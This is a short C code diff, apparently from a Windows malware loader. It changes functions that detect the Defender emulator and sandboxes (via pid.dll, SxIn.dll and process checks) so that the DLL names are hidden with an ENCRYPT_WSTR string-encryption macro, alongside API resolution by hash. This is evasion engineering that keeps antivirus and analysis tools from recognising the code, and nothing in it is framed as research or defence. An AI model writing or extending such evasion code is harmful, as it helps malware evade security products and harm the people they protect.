@@ -880,7 +880,7 @@ BOOLEAN wdIsEmulatorPresent3(VOID){
 #pragma warning(pop)
 
 BOOLEAN checkDllGetClassObject() {
-    pDllGetClassObject DllGetClassObject = (pDllGetClassObject)GetProcAddressbyHASH(myLoadLibrary(L"pid.dll"), DllGetClassObject_Hashed);
+    pDllGetClassObject DllGetClassObject = (pDllGetClassObject)GetProcAddressbyHASH(myLoadLibrary(ENCRYPT_WSTR("pid.dll")), DllGetClassObject_Hashed);
     GUID sid = { 0 };
     GUID iid = { 0 };
     LPVOID lpmem = NULL;
@@ -889,7 +889,7 @@ BOOLEAN checkDllGetClassObject() {
     return(hr != CLASS_E_CLASSNOTAVAILABLE);
 }
 BOOLEAN checkSxInDll() {
-    if (myLoadLibrary(L"SxIn.dll")) return TRUE;
+    if (myLoadLibrary(ENCRYPT_WSTR("SxIn.dll"))) return TRUE;
     return FALSE;
 }
 BOOLEAN checkProcessVX_QQ() {
